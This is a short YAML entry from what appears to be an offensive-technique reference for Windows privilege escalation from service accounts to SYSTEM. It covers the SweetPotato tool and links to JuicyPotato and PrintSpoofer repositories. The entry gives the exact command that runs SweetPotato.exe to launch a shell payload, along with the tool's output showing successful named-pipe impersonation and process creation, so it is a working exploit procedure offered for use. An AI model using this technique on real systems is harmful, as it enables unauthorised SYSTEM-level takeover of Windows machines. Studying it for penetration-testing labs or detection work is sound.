---
functions:
  privilege-escalation:
    - description: A collection of various native Windows privilege escalation techniques from service accounts to SYSTEM
      code: |
        ./SweetPotato.exe -p C:\Users\nathan\Nexus\nexus-3.21.0-05\shell.exe
        SweetPotato by @_EthicalChaos_
          Orignal RottenPotato code and exploit by @foxglovesec
          Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
          PrintSpoofer discovery and original exploit by @itm4n
          EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam
        [+] Attempting NP impersonation using method PrintSpoofer to launch C:\Users\nathan\Nexus\nexus-3.21.0-05\shell.exe
        [+] Triggering notification on evil PIPE \\billyboss/pipe/6265ea16-b179-4951-a8f7-379aea157d97
        [+] Server connected to our evil RPC pipe
        [+] Duplicated impersonation token ready for process creation
        [+] Intercepted and authenticated successfully, launching program
        [+] Process created, enjoy!


resources: |
  https://github.com/CCob/SweetPotato
  https://github.com/ohpe/juicy-potato
  https://github.com/itm4n/PrintSpoofer
  https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
  https://github.com/ivanitlearning/Juicy-Potato-x86/releases/tag/1.2
---
